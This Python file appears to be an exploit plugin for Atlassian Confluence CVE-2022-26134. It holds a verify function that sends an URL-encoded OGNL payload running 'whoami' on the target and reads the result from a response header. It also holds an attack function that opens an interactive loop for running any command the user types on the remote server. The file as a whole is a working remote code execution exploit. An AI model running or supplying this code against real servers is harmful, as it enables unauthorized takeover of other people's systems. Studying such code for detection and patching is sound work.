import urllib
import requests
import re

def verify(url):
    relsult = {
        'name': 'Atlassian Confluence 远程代码执行(CVE-2022-26134)',
        'vulnerable': False,
        'attack': True,
        'url': url,
        'about': 'https://mp.weixin.qq.com/s/L9zZdynW5bRaGESapw0oeA, '
                 'https://github.com/jbaines-r7/through_the_wire',
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
    }
    cmd = 'whoami'
    vurl1 = urllib.parse.urljoin(url, '/login.action')
    vurl2 = urllib.parse.urljoin(url, '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22' + cmd + '%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/')
    version = ''
    try:
        rep1 = requests.get(vurl1, verify=False, timeout=3)
        if rep1.status_code == 200:
            filter_version = re.findall("<span id='footer-build-information'>.*</span>", rep1.text)
            if len(filter_version) >= 1:
                version = filter_version[0].split("'>")[1].split('</')[0]
            rep2 = requests.get(vurl2, headers=headers, verify=False, allow_redirects=False, timeout=3)
            if rep2.status_code == 302:
                relsult['vulnerable'] = True
                relsult['version'] = version
                relsult['cmd'] = cmd
                relsult['verify'] = rep2.headers['X-Cmd-Response']
            return relsult
        else:
            return relsult
    except:
        return relsult


def attack(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
    }
    print('[+] 开始执行命令(输入exit退出)!')
    cmd = ''
    try:
        while cmd != 'exit':
            cmd = input('[+] 执行命令 > ')
            try:
                vurl = urllib.parse.urljoin(url, '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22' + cmd + '%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/')
                rep = requests.get(vurl, headers=headers, verify=False, allow_redirects=False, timeout=3)
                if rep.status_code == 302:
                    output = rep.headers['X-Cmd-Response']
                    print('[+] 执行结果: ', output)
            except:
                print('[+] 执行超时，请检查是否成功?')
                pass
        return True
    except:
        return False
